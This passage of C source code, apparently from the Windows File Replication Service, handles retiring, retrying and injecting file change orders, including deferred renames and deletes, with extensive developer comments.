            SetFlag(RetireFlags, ISCU_UPDATE_IDT_ENTRY);

            if (!CO_FLAG_ON(ChangeOrder, CO_FLAG_GROUP_ANY_REFRESH)) {
                SetFlag(RetireFlags, ISCU_INS_OUTLOG);
            }

            //
            // If this is just an OID reset operation (some other agent tried
            // to change the OID on the file) then we do not insert the CO in
            // the outbound log and we do not update the entire IDTable record
            // (update just the USN field).  If we updated the IDTable entry with
            // the new VSN for this change order AND a VVJOIN scan was going on
            // at the same time then the VVJOIN code will not create a CO for
            // the file since it is expecting that a new CO will be forthcoming
            // in the Outbound log.  That is not true in this case so no CO would
            // get sent to the VVJoining partner.  To avoid this we don't
            // update the VSN field in the change order since the whole deal was
            // a no-op anyway.
            //
            if (CO_FLAG_ON(ChangeOrder, CO_FLAG_JUST_OID_RESET)) {
                ClearFlag(RetireFlags, ISCU_INS_OUTLOG);
                ClearFlag(RetireFlags, ISCU_UPDATE_IDT_ENTRY);
                SetFlag(RetireFlags, ISCU_UPDATE_IDT_FILEUSN);
            }

            TALLY_LOCALCO_STATS(ConfigRecord, NumCoRetired, 1);
        }
    }

    //
    // Mark the FileUsn field of the change order valid.  This allows the
    // OutLog process to make valid USN tests on requested staging files.
    // This can not be set on the retry path because the install and final
    // rename will change the USN on the file.
    //
    // Note: The change order is picking up the usn of the file on this
    // machine.  When the staging file is fetched from the inbound partner the
    // FileUsn reflects the value for the file on this machine and not the usn
    // of the file on the inbound partner Hence, the usn is not valid.  Even if
    // this were fixed by retaining the value of the FileUsn from the inbound
    // partner, the value on the inbound partner may change when the staging
    // file is installed.
    //
    // SET_CO_FLAG(ChangeOrder, CO_FLAG_FILE_USN_VALID);

    //
    // Finally cleanup the CO Issue structs and delete the inbound log entry.
    // Both of these are done under ref count control.
    //
    SetFlag(RetireFlags, (ISCU_ISSUE_CLEANUP));

    if (!COE_FLAG_ON(ChangeOrder, COE_FLAG_DELETE_GEN_CO)) {
        SetFlag(RetireFlags, ISCU_DEL_INLOG);
    }

    //
    // Do it.
    //
    SetFlag(RetireFlags, ISCU_NO_CLEANUP_MERGE);
    FStatus = ChgOrdIssueCleanup(ThreadCtx, Replica, ChangeOrder, RetireFlags);

ERROR_RETURN:

    if (!FRS_SUCCESS(FStatus)) {
        JrnlSetReplicaState(Replica, REPLICA_STATE_ERROR);
        //
        // Note:  Multiple COs can retire and set Replica->FStatus
        //        Need another mechanism if initiator cares.
        //
        Replica->FStatus = FStatus;
    }

    return FStatus;

}


ULONG
DbsDoRenameOrDelete(
    IN  PTHREAD_CTX ThreadCtx,
    IN  PREPLICA Replica,
    IN  PCHANGE_ORDER_ENTRY ChangeOrder,
    OUT PBOOL AbortCo
)
/*++

Routine Description:

    Execute final rename or deferred delete for the change order.
    If the rename or delete fails the caller sends the CO thru the retry path.
    If a dir delete fails because there are now valid children under the dir
    then we abort the CO.

Arguments:

    Replica  -- ptr to replica struct
    ChangeOrder -- ptr to change order entry
    Abort       -- ptr to BOOL to return updated CO abort status.

Return Value:

    FrsStatus
        FrsErrorDirNotEmpty - Delete dir fails due to valid children
        FrsErrorRetry - Operation could not be done now.  Send CO thru retry.
        FrsErrorSuccess - Operation succeeded.

--*/

{
#undef DEBSUB
#define DEBSUB "DbsDoRenameOrDelete:"

    ULONG                 WStatus;
    PCHANGE_ORDER_COMMAND CoCmd;
    PREPLICA_THREAD_CTX   RtCtx;
    PIDTABLE_RECORD       IDTableRec;
    BOOL                  DeleteCo;
    ULONG                 LocationCmd;
    ULONG                 Len;

    CoCmd = &ChangeOrder->Cmd;

    LocationCmd = GET_CO_LOCATION_CMD(ChangeOrder->Cmd, Command);
    DeleteCo = (LocationCmd == CO_LOCATION_DELETE) ||
               (LocationCmd == CO_LOCATION_MOVEOUT);

    //
    // A newly created file is first installed into a temporary file and then
    // renamed to its final destination.  The rename may fail if the user has
    // used the filename for another file.  This case is handled later.
    // However, a subsequent change order may arrive before retrying the
    // failing rename.  The new change order will attempt the rename because
    // the idtable entry has the deferred rename bit set.  This old change
    // order will be discarded by the reconcile code in ChgOrdAccept().
    //
    // We attempt the rename here so that the file's usn value
    // is correct in the change order.
    //
    // Ditto afor deferred deletes.
    //
    WStatus = ERROR_SUCCESS;
    if (!DeleteCo && COE_FLAG_ON(ChangeOrder, COE_FLAG_NEED_RENAME)) {

        //
        // NOTE: We must use the info in the IDTable to do the final rename
        // since we could have multiple COs in the IBCO_INSTALL_REN_RETRY
        // state and only the IDTable has the correct info re the final location
        // and name for the file.  If the CO does not arrive here in the
        // REN_RETRY state then use the state in the change order as given.
        //
        if (CO_STATE_IS(ChangeOrder, IBCO_INSTALL_REN_RETRY)) {
            RtCtx = ChangeOrder->RtCtx;
            FRS_ASSERT(RtCtx != NULL);

            IDTableRec = RtCtx->IDTable.pDataRecord;
            FRS_ASSERT(IDTableRec != NULL);

            CoCmd->NewParentGuid = IDTableRec->ParentGuid;
            ChangeOrder->NewParentFid = IDTableRec->ParentFileID;

            Len = wcslen(IDTableRec->FileName) * sizeof(WCHAR);
            CopyMemory(CoCmd->FileName, IDTableRec->FileName, Len);
            CoCmd->FileName[Len/sizeof(WCHAR)] = UNICODE_NULL;

            CoCmd->FileNameLength = (USHORT) Len;
        }


        //TEST_DBSRENAMEFID_TOP(ChangeOrder);
        WStatus = DbsRenameFid(ChangeOrder, Replica);
        //TEST_DBSRENAMEFID_BOTTOM(ChangeOrder, WStatus);

        //
        // Short circuit the retire process if the file could not be renamed
        // into its final destination.  Set the change order as "retry later"
        // in the inbound log.  The change order is done except for this.
        // If this is the first time through for this change order then
        // DbsRetryInboundCo will take care of VV update, partner Ack, ...
        // In addition it updates the IDTable record to show the rename is
        // still pending.
        //
        if (WIN_RETRY_INSTALL(WStatus) ||
            WIN_ALREADY_EXISTS(WStatus) || (WStatus == ERROR_DELETE_PENDING)) {
            SET_CHANGE_ORDER_STATE(ChangeOrder, IBCO_INSTALL_REN_RETRY);

            return FrsErrorRetry;
        }

    } else

    if (DeleteCo && COE_FLAG_ON(ChangeOrder, COE_FLAG_NEED_DELETE)) {
        //
        // Handle deferred delete.
        //
        CHANGE_ORDER_TRACE(3, ChangeOrder, "Attempt Deferred Delete");

        WStatus = StuDelete(ChangeOrder);
        if (!WIN_SUCCESS(WStatus)) {
            //
            // Short circuit the retire process if the file could not be deleted.
            //
            if (WIN_RETRY_DELETE(WStatus)) {
                //
                // Send all deletes COs through retry if the delete fails.
                // Directory deletes will retry until all valid children are deleted.
                // Valid children check is made in chgorder.c (ChgOrdDispatch())
                // Delete retry path will mark the IDTable entry as
                // IDREC_FLAGS_DELETE_DEFERRED
                //
                // Set the change order as IBCO_INSTALL_DEL_RETRY in the
                // inbound log.  The change order is done except for this.  If
                // this is the first time through for this change order then
                // DbsRetryInboundCo will take care of VV update, partner Ack,
                // ...  In addition it updates the IDTable record to show the
                // delete is still pending.
                //
                SET_CHANGE_ORDER_STATE(ChangeOrder, IBCO_INSTALL_DEL_RETRY);

                return FrsErrorRetry;
            }
        }
    }

    return FrsErrorSuccess;
}

ULONG
DbsRetireInboundCo(
    IN PTHREAD_CTX ThreadCtx,
    IN PCOMMAND_PACKET CmdPkt
)
/*++

Routine Description:

    Add revised comment.

Arguments:

    ThreadCtx   -- ptr to the thread context.

    CmdPkt  - The command packt with the retire request.

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsRetireInboundCo:"

    FRS_ERROR_CODE        FStatus;
    PDB_SERVICE_REQUEST   DbsRequest = &CmdPkt->Parameters.DbsRequest;
    PCONFIG_TABLE_RECORD  ConfigRecord;
    PREPLICA              Replica;
    PCHANGE_ORDER_ENTRY   ChangeOrder;
    PREPLICA_THREAD_CTX   RtCtx;
    ULONG                 RetireFlags;
    BOOL                  RemoteCo, AbortCo, ValidDirChild;
    ULONG                 CondTest, i;
    PCO_RETIRE_DECISION_TABLE pDecRow;
    PCHAR                 pTag;
    CHAR                  TempStr[120];


    FRS_ASSERT(DbsRequest != NULL);

    Replica       = DbsRequest->Replica;
    FRS_ASSERT(Replica != NULL);

    ChangeOrder   = (PCHANGE_ORDER_ENTRY) DbsRequest->CallContext;
    FRS_ASSERT(ChangeOrder != NULL);

    RemoteCo = !CO_FLAG_ON(ChangeOrder, CO_FLAG_LOCALCO);

    AbortCo = COE_FLAG_ON(ChangeOrder, COE_FLAG_STAGE_ABORTED) ||
              CO_STATE_IS(ChangeOrder, IBCO_ABORTING);

    ConfigRecord = (PCONFIG_TABLE_RECORD) (Replica->ConfigTable.pDataRecord);
    FRS_ASSERT(ConfigRecord != NULL);


    ValidDirChild = FALSE;
    RetireFlags = 0;

    if (!AbortCo) {
        //
        // Do final rename of target file or handle deferred delete.
        //
        FStatus = DbsDoRenameOrDelete(ThreadCtx, Replica, ChangeOrder, &AbortCo);
        if (FStatus == FrsErrorRetry) {
            return (DbsRetryInboundCo(ThreadCtx, CmdPkt));
        }
        //
        // We could get dir not empty if a dir delete now has valid children.
        //
        if (FStatus == FrsErrorDirNotEmpty) {
            ValidDirChild = TRUE;
        }
    }

    //
    // Increment the Local OR Remote CO Aborted OR Retired counters
    //
    if (AbortCo) {
        if (RemoteCo) {
            PM_INC_CTR_REPSET(Replica, RCOAborted, 1);
            TALLY_REMOTECO_STATS(ConfigRecord, NumCoAborts, 1);
        }
        else {
            PM_INC_CTR_REPSET(Replica, LCOAborted, 1);
            TALLY_LOCALCO_STATS(ConfigRecord, NumCoAborts, 1);
        }
    } else {
        if (RemoteCo) {
            PM_INC_CTR_REPSET(Replica, RCORetired, 1);
            TALLY_REMOTECO_STATS(ConfigRecord, NumCoRetired, 1);
        }
        else {
            PM_INC_CTR_REPSET(Replica, LCORetired, 1);
            TALLY_LOCALCO_STATS(ConfigRecord, NumCoRetired, 1);
        }
    }

    //
    // Decide what to do about the staging file.
    // A local change order is trying to generate the staging file and a
    // failure here means it hasn't yet been generated.
    // A remote change order is trying to fetch and install the staging file
    // and a failure here means the install could not be completed.
    // There are a number of cases.
    //
    // Local, No partners  -- no staging file is created.
    // Local, 1st time, With partners -- Outlog will del staging file
    // Local, 1st time, Abort, With partners -- Del stagefile (if any)
    // Local, retry, with partners -- stagefile now gen, Outlog dels staging file
    // Local, retry, abort, with partners -- Del stagefile (if any)
    //
    // Remote, No partners  -- Del stagefile
    // Remote, 1st time, with partners -- OLOG will del stagefile
    // Remote, 1st time, Abort, with partners -- Del stagefile
    // Remote, retry, with partners -- Clear flag in olog
    // Remote, retry, Abort, with partners -- clear flag in olog
    //

    //
    // Check for the case of an aborted CO.  We do nothing here if the user
    // deleted the file so we couldn't generate the staging file.
    //
    if (AbortCo &&
        !COE_FLAG_ON(ChangeOrder, COE_FLAG_STAGE_DELETED)) {
        //
        // If the abort is on a dir create then pitch the CO.
        // (not if it's a parent reanimation though).
        // (not if it's a reparse)
        //

        if (CoIsDirectory(ChangeOrder) &&
            (!COE_FLAG_ON(ChangeOrder, COE_FLAG_PARENT_REANIMATION)) &&
            (!(ChangeOrder->Cmd.FileAttributes & FILE_ATTRIBUTE_REPARSE_POINT))) {

            ULONG LocationCmd = GET_CO_LOCATION_CMD(ChangeOrder->Cmd, Command);

            if (CO_NEW_FILE(LocationCmd)) {
                //
                // Unfortunately we can get an "update CO" for an existing file
                // and the CO has a location command of CREATE.  So we can't
                // be sure that the error we are seeing is a case of failing
                // to update a pre-existing file in the replica tree that has
                // been deleted out from under us.   If it has been deleted
                // then a local CO should be coming that tells us that.
                // If it hasn't been deleted and the install failed because we
                // ran out of disk space or some other problem then we could
                // have problems later when a child create shows up and there
                // is no parent.  To address this, InstallCsInstallStage()
                // checks if the pre-exisitng target file was deleted and it
                // sends the change order thru retry (or unjoins the connection)
                // as appropriate.  If a dir create fails for some other reason
                // we end up here.
                //
                CHANGE_ORDER_TRACE(3, ChangeOrder, "Dir create failed, aborting");
                FRS_PRINT_TYPE(0, ChangeOrder);
            }
        }
    }

    SET_CHANGE_ORDER_STATE(ChangeOrder, IBCO_COMMIT_STARTED);

    //
    // Construct the test value.
    //
    CondTest = (CO_FLAG_ON(ChangeOrder, CO_FLAG_LOCALCO)           ? 1 : 0) << 8
             | (AbortCo                                            ? 1 : 0) << 7
             | (CO_FLAG_ON(ChangeOrder, CO_FLAG_VV_ACTIVATED)      ? 1 : 0) << 6
             | (CO_IFLAG_ON(ChangeOrder, CO_IFLAG_VVRETIRE_EXEC)   ? 1 : 0) << 5
             | (CO_FLAG_ON(ChangeOrder, CO_FLAG_GROUP_ANY_REFRESH) ? 1 : 0) << 4
             | (CO_FLAG_ON(ChangeOrder, CO_FLAG_RETRY)             ? 1 : 0) << 3
             | (CO_FLAG_ON(ChangeOrder, CO_FLAG_JUST_OID_RESET)    ? 1 : 0) << 2
             | (CO_FLAG_ON(ChangeOrder, CO_FLAG_NEW_FILE)          ? 1 : 0) << 1
             | (ValidDirChild                                      ? 1 : 0) << 0;

    //
    // Step thru the change order retire decsion table and select the matching
    // cleanup actions.
    //
    pDecRow = CoRetireDecisionTable;
    i = 0;
    TempStr[0] = '\0';
    while (pDecRow->RetireFlag != 0) {
        if ((CondTest & pDecRow->DontCareMask) == pDecRow->ConditionMatch) {
            RetireFlags |= pDecRow->RetireFlag;
            _snprintf(TempStr, sizeof(TempStr), "%s %d", TempStr, i);
            TempStr[sizeof(TempStr)-1] = '\0';
        }
        i++;
        pDecRow += 1;
    }
    DPRINT3(4, "++ CondTest %08x - RetireFlags %08x - %s\n", CondTest, RetireFlags, TempStr);


    if (AbortCo) {
        SET_CO_FLAG(ChangeOrder, CO_FLAG_ABORT_CO);  // used in VVRetireChangeOrder()
    }

    if (RemoteCo) {

        //
        // Remote CO retire.  Activate VV retire slot if not yet done.
        //
        //if (!CO_FLAG_ON(ChangeOrder, CO_FLAG_VV_ACTIVATED)) {
            //SET_CO_FLAG(ChangeOrder, CO_FLAG_VV_ACTIVATED);
        //}
        //
        // Install is done.  Clear incomplete flag and update IDT entry
        // with the new file state.
        //
        CLEAR_CO_FLAG(ChangeOrder, CO_FLAG_INSTALL_INCOMPLETE);
        //
        // Note: If partial installs are provided then only update the
        // appropriate IDTable elements to prevent data from moving backwards
        // if the partial instals can complete out of order.

    } else {

        //
        // Local CO retire.
        //
        //else {
            //
            // Local CO retire.  Activate VV retire slot if not yet done.
            //
            //if (!CO_FLAG_ON(ChangeOrder, CO_FLAG_VV_ACTIVATED)) {
                //SET_CO_FLAG(ChangeOrder, CO_FLAG_VV_ACTIVATED);
            //}

        //}
    }

    //
    // Mark the FileUsn field of the change order valid.  This allows the
    // OutLog process to make valid USN tests on requested staging files.
    // This can not be set on the retry path because the install and final
    // rename will change the USN on the file.
    //
    // Note: The change order is picking up the usn of the file on this
    // machine.  When the staging file is fetched from the inbound partner the
    // FileUsn reflects the value for the file on this machine and not the usn
    // of the file on the inbound partner Hence, the usn is not valid.  Even if
    // this were fixed by retaining the value of the FileUsn from the inbound
    // partner, the value on the inbound partner may change when the staging
    // file is installed.
    //
    // SET_CO_FLAG(ChangeOrder, CO_FLAG_FILE_USN_VALID);

    //
    // Finally cleanup the CO Issue structs and delete the inbound log entry.
    // Both of these are done under ref count control.
    //
    SetFlag(RetireFlags, (ISCU_ISSUE_CLEANUP));

    if (!COE_FLAG_ON(ChangeOrder, COE_FLAG_DELETE_GEN_CO)) {
        SetFlag(RetireFlags, ISCU_DEL_INLOG);
    }

    //
    // Produce a tracking record for the log.
    //
    pTag = (AbortCo) ?
              ((RemoteCo) ? "RemCo, Abort" : "LclCo, Abort") :
              ((RemoteCo) ? "RemCo" : "LclCo");

    FRS_TRACK_RECORD(ChangeOrder, pTag);

    //
    // Do it.
    //
    SetFlag(RetireFlags, ISCU_NO_CLEANUP_MERGE);
    FStatus = ChgOrdIssueCleanup(ThreadCtx, Replica, ChangeOrder, RetireFlags);

ERROR_RETURN:

    if (!FRS_SUCCESS(FStatus)) {
        JrnlSetReplicaState(Replica, REPLICA_STATE_ERROR);
        //
        // Note:  Multiple COs can retire and set Replica->FStatus
        //        Need another mechanism if initiator cares.
        //
        Replica->FStatus = FStatus;
    }

    return FStatus;

}


ULONG
DbsInjectOutboundCo(
    IN PTHREAD_CTX ThreadCtx,
    IN PCOMMAND_PACKET CmdPkt
)
/*++

Routine Description:

    This function injects a handcrafted change order into the outbound log.

    This function is designed to support version vector joining (vvjoin.c).

Arguments:

    ThreadCtx   -- ptr to the thread context.

    CmdPkt  - The command packt with the retire request.

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsInjectOutboundCo:"

    FRS_ERROR_CODE        FStatus;
    PDB_SERVICE_REQUEST   DbsRequest = &CmdPkt->Parameters.DbsRequest;
    PREPLICA              Replica;
    PCHANGE_ORDER_ENTRY   ChangeOrder;
    ULONG                 RetireFlags = 0;
    ULONG                 LocationCmd;


    FRS_ASSERT(DbsRequest != NULL);

    Replica       = DbsRequest->Replica;
    FRS_ASSERT(Replica != NULL);

    ChangeOrder   = (PCHANGE_ORDER_ENTRY) DbsRequest->CallContext;
    FRS_ASSERT(ChangeOrder != NULL);

    LocationCmd = GET_CO_LOCATION_CMD(ChangeOrder->Cmd, Command);
    FRS_ASSERT(LocationCmd == CO_LOCATION_CREATE ||
               LocationCmd == CO_LOCATION_DELETE ||
               CO_FLAG_ON(ChangeOrder, CO_FLAG_CONTROL));
    FRS_ASSERT(CO_FLAG_ON(ChangeOrder, CO_FLAG_LOCALCO));

    //
    // Change of plans; allow the propagation to occur so that
    // parallel vvjoins and vvjoinings work (A is vvjoining B is
    // vvjoining C).
    //
    // FRS_ASSERT(CO_FLAG_ON(ChangeOrder, CO_FLAG_REFRESH));

    //
    // Insert into the outbound log and free the change order entry
    // There is no inbound log entry and there is no staging file.
    // The staging file is generated on demand.
    //
    RetireFlags = ISCU_INS_OUTLOG |
                  ISCU_DEL_RTCTX  |
                  ISCU_DEC_CO_REF |
                  ISCU_FREE_CO;

    //
    // Do it.
    //
    SetFlag(RetireFlags, ISCU_NO_CLEANUP_MERGE);
    FStatus = ChgOrdIssueCleanup(ThreadCtx, Replica, ChangeOrder, RetireFlags);

ERROR_RETURN:

    if (!FRS_SUCCESS(FStatus)) {
        JrnlSetReplicaState(Replica, REPLICA_STATE_ERROR);
        //
        // Note:  Multiple COs can retire and set Replica->FStatus
        //        Need another mechanism if initiator cares.
        //
        Replica->FStatus = FStatus;
    }

    return FStatus;

}



ULONG
DbsRetryInboundCo(
    IN PTHREAD_CTX ThreadCtx,
    IN PCOMMAND_PACKET CmdPkt
)
/*++

Routine Description:

    The inbound change order has failed to complete.  This could be due to:

        1.  a sharing violation on the target file for a remote change order
            preventing the Install of the staging file, IBCO_INSTALL_RETRY
        2.  a sharing violation on the source file for a local change order
            preventing the generation of the staging file, IBCO_STAGING_RETRY
        3.  a problem fetching the staging file from an inbound partner for
            a remote chang order, IBCO_FETCH_RETRY
        4.  a problem renaming the file into its target location. IBCO_INSTALL_REN_RETRY
        5.  a problem deleting the file or dir. IBCO_INSTALL_DEL_RETRY

    Set up the change order to be retried. It does the following:

        Set the CO_FLAG_RETRY flag in the change order.
        Once we have the staging file we can activate the version vector
        retire slot.  When the slot reaches the head of the VV retire list
        the version vector is updated and the change order is propagated to
        the outbound log.  Those actions are not done here.

        If a remote CO and the state is IBCO_INSTALL_RETRY then set the
        CO_FLAG_INSTALL_INCOMPLETE flag so the outbound log doesn't delete
        the staging file.

        For remote CO's, when we activate the VV slot we also Ack the inbound
        partner and update the IDT table for the file so new CO's can test
        against it.

        Update the CO in the inbound log. (caller provides the CO state to save)
        Cleanup the Issue Conflict tables.

    The TableCtx structs in the ChangeOrder RtCtx are used to update
    the database records.

Arguments:

    ThreadCtx   -- ptr to the thread context.

    CmdPkt  - The command packt with the retire request.

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsRetryInboundCo:"

    JET_ERR               jerr, jerr1;
    FRS_ERROR_CODE        FStatus;
    PDB_SERVICE_REQUEST   DbsRequest = &CmdPkt->Parameters.DbsRequest;
    PREPLICA              Replica;
    PCHANGE_ORDER_ENTRY   ChangeOrder;
    PCHANGE_ORDER_COMMAND CoCmd;
    BOOL                  FirstTime;
    BOOL                  RemoteCo;
    ULONG                 RetireFlags = 0;
    PIDTABLE_RECORD       IDTableRec;
    PCHAR                 pTag;

    // Note: Check that we don't reorder change orders that would cause name
    // space conflicts.  see below.
    //
    // Note: We can't move the change order to the end of the list
    // because it could result in a name conflict with an operation behind
    // it.  E.G. A delete followed by a create with the same name.  Even
    // though the FIDs are different we would still send the change orders
    // out to other replicas in the wrong order.  So name space operations
    // can never be reordered.
    //
    // Examine sequences of name space operations and the effects of reordering.
    // Look for notes on this.
    //

    FRS_ASSERT(DbsRequest != NULL);

    Replica = DbsRequest->Replica;
    FRS_ASSERT(Replica != NULL);

    ChangeOrder = (PCHANGE_ORDER_ENTRY) DbsRequest->CallContext;
    FRS_ASSERT(ChangeOrder != NULL);
    FRS_ASSERT(ChangeOrder->RtCtx != NULL);
    FRS_ASSERT(IS_ID_TABLE(&ChangeOrder->RtCtx->IDTable));

    IDTableRec = ChangeOrder->RtCtx->IDTable.pDataRecord;
    FRS_ASSERT(IDTableRec != NULL);

    CoCmd = &ChangeOrder->Cmd;

    RemoteCo  = !CO_FLAG_ON(ChangeOrder, CO_FLAG_LOCALCO);
    FirstTime = !CO_FLAG_ON(ChangeOrder, CO_FLAG_RETRY);

    DPRINT5(4, "++ %s CO State, Flags, File on %s entry: %s  %08x  %ws\n",
            (RemoteCo ? "Remote" : "Local "), (FirstTime ? "1st" : "Nth"),
            PRINT_CO_STATE(ChangeOrder), CoCmd->Flags, CoCmd->FileName);

    //
    // We only understand the following kinds of retry operations.
    //
    if (RemoteCo) {
        FRS_ASSERT(CO_STATE_IS_REMOTE_RETRY(ChangeOrder));
    } else {
        //
        // Can't come thru retry with a moveout generated delete CO since
        // there is no INLOG record for it.
        //
        // Abort the change order because the only reason this co will retry
        // is if the cxtion is unjoining.  The originating, moveout co will
        // regenerate the del cos during the recovery at the next join.
        //
        if (COE_FLAG_ON(ChangeOrder, COE_FLAG_DELETE_GEN_CO)) {
            CHANGE_ORDER_TRACE(3, ChangeOrder, "Moveout Del Retry Aborted");
            SET_CHANGE_ORDER_STATE(ChangeOrder, IBCO_ABORTING);
            return  DbsRetireInboundCo(ThreadCtx, CmdPkt);
        }

        //
        // Morph Gen local COs also don't go in the INLog since they get
        // regenerated as long as the Morph Conflict still exists.  So
        // Abort the change order.  The base CO will go thru retry.
        //
        if (CO_FLAG_ON(ChangeOrder, CO_FLAG_MORPH_GEN)) {
            CHANGE_ORDER_TRACE(3, ChangeOrder, "MorphGenCo Aborted");
            SET_CHANGE_ORDER_STATE(ChangeOrder, IBCO_ABORTING);
            return  DbsRetireInboundCo(ThreadCtx, CmdPkt);
        }
    }

    //
    // If this is a parent reanimation CO then retry is not an option.
    // Send this bad boy to retire with the Abort flag set.
    //
    if (COE_FLAG_ON(ChangeOrder, COE_FLAG_PARENT_REANIMATION)) {
        CHANGE_ORDER_TRACE(3, ChangeOrder, "Parent Reanimate Retry Aborted");
        SET_CHANGE_ORDER_STATE(ChangeOrder, IBCO_ABORTING);
        return  DbsRetireInboundCo(ThreadCtx, CmdPkt);
    }

    //
    // Aborts must go through retire, NOT retry path.
    //
    FRS_ASSERT(!CO_FLAG_ON(ChangeOrder, CO_FLAG_ABORT_CO));

    //
    // This CO is now a retry change order.
    //
    SET_CO_FLAG(ChangeOrder, CO_FLAG_RETRY);

    //
    // If this is a local CO that is in the process of creating a new file
    // AND we can't generate the staging file or stamp the OID on the file
    // (i.e. state is IBCO_STAGING_RETRY) then we MUST preserve the IDTable
    // entry because it has the FIDs for the file.  The FIDs are not saved
    // in the INlog record, only the GUIDs.  The assigned Guid for the file
    // must also be preserved so the retry re-issue of the CO can find the
    // IDTable Record when it translates the GUID to the FID.
    //
    // Consider the following scenario:
    //  CO1:  Local file create fails to generate stage file due to share viol.
    //        IDTRec->NewFileInprog set.
    //        CO1 goes to retry.
    //
    //  CO2:  Now an update CO arrives for same file as above.  We have to be
    //        sure to use same IDT entry and same GUID assigned to the file
    //        by CO1 otherwise when CO1 is later retried it won't be able
    //        to do the Guid to Fid translation, causing it to assert.  This
    //        occurs regardless of whether CO2 completes, aborts or goes thru
    //        retry since eventually CO1 will be retried.
    //        Clearing NewFileInProgress and setting DeferredCreate ensures this.
    //
    // HOWEVER:
    // If this is a Delete CO with the NEW_FILE_IN_PROGRESS flag set then we
    // are in the process of creating a tombstone entry in the IDTable.  This
    // CO probably got sent thru retry because we unjoined the journal connection.
    // One way a local CO like this gets created is when an incoming remote CO
    // loses a name morph conflict.  A local CO delete is fabricated and sent
    // out so all other members see the result.  In this case, leave the IDTable
    // flags alone so the right things happen when the CO is retried.
    //
    if (!RemoteCo &&
        CO_STATE_IS(ChangeOrder, IBCO_STAGING_RETRY) &&
        IsIdRecFlagSet(IDTableRec, IDREC_FLAGS_NEW_FILE_IN_PROGRESS)) {

        if (!CO_LOCN_CMD_IS(ChangeOrder, CO_LOCATION_DELETE)) {
            ClearIdRecFlag(IDTableRec, IDREC_FLAGS_NEW_FILE_IN_PROGRESS);
            SetIdRecFlag(IDTableRec, IDREC_FLAGS_CREATE_DEFERRED);

            SetFlag(RetireFlags, ISCU_UPDATE_IDT_FLAGS);
        }

        //
        // Prevent deletion of IDTable entry later because a subsequent Local
        // CO (X) may have completed an update on the file and be in the process
        // queue.  If so then we will need the GUID to FID translation provided
        // by this IDTable entry so when we retry this CO later we find the same
        // IDTable entry (but this time with the updated state provided by CO
        // X).  Recall that the InLog record does not keep FIDs so the only way
        // we get back to the same IDTable record that X will use is with the
        // GUID.
        //
        CLEAR_CO_FLAG(ChangeOrder, CO_FLAG_NEW_FILE);
    }




    //
    // Set CO_FLAG_INSTALL_INCOMPLETE to keep the Oubound log from deleting
    // the staging file if this CO still hasn't done the install.
    //
    if (RemoteCo && CO_STATE_IS(ChangeOrder, IBCO_INSTALL_RETRY)) {
        SET_CO_FLAG(ChangeOrder, CO_FLAG_INSTALL_INCOMPLETE);
    }

    //
    // If the change order has progressed far enough to Activate the version
    // vector retire slot and Ack the inbound partner then do it.
    // Local change orders only do this through the normal retire path since we
    // can't propagate the CO to the outbound log until we have a staging file
    // generated.  The partner Ack will happen now but the actual VV update may
    // be delayed if it is blocked by other VV updates in the retire list.  This
    // call just activates the VV retire slot.
    //
    if (!CO_FLAG_ON(ChangeOrder, CO_FLAG_VV_ACTIVATED)) {

        if (RemoteCo && CO_STATE_IS_INSTALL_RETRY(ChangeOrder)) {

            SetFlag(RetireFlags, ISCU_ACTIVATE_VV  | ISCU_ACK_INBOUND);

            //
            // Updating the IDTable on a change order in the retry path will
            // eventually cause it to be rejected when it is later retried.  In
            // addition a dup CO from another inbound partner will also get
            // rejected even though it should get a shot.  So instead of
            // updating the entire record we just update the Flags here.
            // BUT ... see comment below re DELETE_DEFERRED.
            //
            SetFlag(RetireFlags, ISCU_UPDATE_IDT_FLAGS);
            //
            // perf: If the staging file is already fetched then we should detect
            //       that and avoid refetching it.

            if (!CO_FLAG_ON(ChangeOrder, CO_FLAG_GROUP_ANY_REFRESH)) {
                SetFlag(RetireFlags, ISCU_INS_OUTLOG);
            }
            //
            // Don't do it again on future retries.
            //
            //SET_CO_FLAG(ChangeOrder, CO_FLAG_VV_ACTIVATED);
        } else {
            //
            // Can't activate the retire slot so discard it.  If it is a Remote
            // change order and the problem wasn't caused by a loss of the
            // inbound connection then it is probably out of order.
            //
            SetFlag(RetireFlags, ISCU_ACTIVATE_VV_DISCARD);
            if (RemoteCo) {
                if (!COE_FLAG_ON(ChangeOrder, COE_FLAG_NO_INBOUND)) {
                    SET_CO_FLAG(ChangeOrder, CO_FLAG_OUT_OF_ORDER);
                }
            }
        }
    }


    //
    // Regardless of what happened above with VV slot activation several flags
    // need to set in the IDTable record if the remote CO is in one of the
    // install retry states.
    //
    if (RemoteCo && CO_STATE_IS_INSTALL_RETRY(ChangeOrder)) {
        //
        // Set IDREC_FLAGS_RENAME_DEFERRED if we failed to rename the
        // preinstall file to its final destination. The first change order
        // that next comes through for this will try again.
        //
        // BUT...  if this CO is in the IBCO_INSTALL_REN_RETRY state then we
        // have actually finished the CO except for the final rename.  So
        // Update the IDTable Record and the journal's parent fid table and
        // filter table and the version state for future COs, etc.
        // Reconcile() will let this CO pass so the rename can be completed
        // as long as as IDREC_FLAGS_RENAME_DEFERRED remains set.  The first
        // CO that completes the rename will clear the bit.
        //
        if (CO_STATE_IS(ChangeOrder, IBCO_INSTALL_REN_RETRY)) {
            SetIdRecFlag(IDTableRec, IDREC_FLAGS_RENAME_DEFERRED);
            SetFlag(RetireFlags, ISCU_UPDATE_IDT_ENTRY);
        }

        //
        // If we come thru here in the IBCO_INSTALL_RETRY state then don't
        // update the full IDTable Record because that updates the version
        // info which has the effect of rejecting other dup COs that may
        // be able to finish this CO.  In addition this CO would get
        // rejected on retry because reconcile will find a version match.
        // See ChgOrdReconcile() for why it must reject matching COs in the
        // IBCO_INSTALL_RETRY state.  But we still must set
        // IDREC_FLAGS_RENAME_DEFERRED if we found it set when we started
        // this CO so that other COs will try to complete the final rename.
        //
        if (COE_FLAG_ON(ChangeOrder, COE_FLAG_NEED_RENAME)) {
            SetIdRecFlag(IDTableRec, IDREC_FLAGS_RENAME_DEFERRED);
        }

        //
        // Set IDREC_FLAGS_DELETE_DEFERRED if we failed to delete the
        // target file/dir. The first change order
        // that next comes through for this will try again.
        //
        // BUT... if this CO is in the delete retry state then we have
        // actually finished the CO except for the final delete.  So Update
        // the IDTable Record.  Reconcile() will let this CO pass as long
        // as IDREC_FLAGS_DELETE_DEFERRED remains set.
        //
